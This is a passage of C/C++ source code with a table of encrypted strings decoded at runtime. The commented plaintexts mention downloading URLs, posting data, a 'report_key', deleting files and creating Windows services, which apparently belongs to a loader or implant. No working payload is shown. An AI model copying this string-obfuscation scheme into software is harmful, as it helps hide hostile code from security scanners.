		// raw str -> "555@wait process 0x%x to exit, time out %d\n"
		encryptStr = "IzU9IHQkJjs3MScndGQscSx0IDt0MSw9IHh0ID05MXQ7ISB0cTBe";
		break;
	case 556:
		// raw str -> "556@wait process 0x%x to exit, failed, break\n"
		encryptStr = "IzU9IHQkJjs3MScndGQscSx0IDt0MSw9IHh0MjU9ODEweHQ2JjE1P14=";
		break;
	case 557:
		// raw str -> "557@download url %s to %s, rc %d\n"
		encryptStr = "MDsjOjg7NTB0ISY4dHEndCA7dHEneHQmN3RxMF4=";
		break;
	case 558:
		// raw str -> "558@post to %s, rc %d, response %s\n"
		encryptStr = "JDsnIHQgO3RxJ3h0Jjd0cTB4dCYxJyQ7OicxdHEnXg==";
		break;
	case 559:
		// raw str -> "559@fuchen,128,"
		encryptStr = "MiE3PDE6eGVmbHg=";
		break;
	case 560:
		// raw str -> "560@run ok\n"
		encryptStr = "JiE6dDs/Xg==";
		break;
	case 561:
		// raw str -> "561@run fails\n"
		encryptStr = "JiE6dDI1PTgnXg==";
		break;
	case 562:
		// raw str -> "562@report_key"
		encryptStr = "JjEkOyYgCz8xLQ==";
		break;
	case 563:
		// raw str -> "563@delete %s ok\n"
		encryptStr = "MDE4MSAxdHEndDs/Xg==";
		break;
	case 564:
		// raw str -> "564@delete %s fails\n"
		encryptStr = "MDE4MSAxdHEndDI1PTgnXg==";
		break;
	case 565:
		// raw str -> "565@DLog.log"
		encryptStr = "EBg7M3o4OzM=";
		break;
	case 566:
		// raw str -> "566@OpenSCManager failed (%d)\n"
		encryptStr = "GyQxOgcXGTU6NTMxJnQyNT04MTB0fHEwfV4=";
		break;
	case 567:
		// raw str -> "567@CreateService failed (%d)\n"
		encryptStr = "FyYxNSAxBzEmIj03MXQyNT04MTB0fHEwfV4=";
		break;
	case 568:
		// raw str -> "568@CreateService successfully\n"
		encryptStr = "FyYxNSAxBzEmIj03MXQnITc3MScnMiE4OC1e";
		break;
	default:
		break;
	}

	DecryptString(encryptStr.c_str(), encryptStr.size(), szLibStrBuffers[id], MAX_PATH);

	LeaveCriticalSection(&csLibCriticalSection);

	return szLibStrBuffers[id];
}
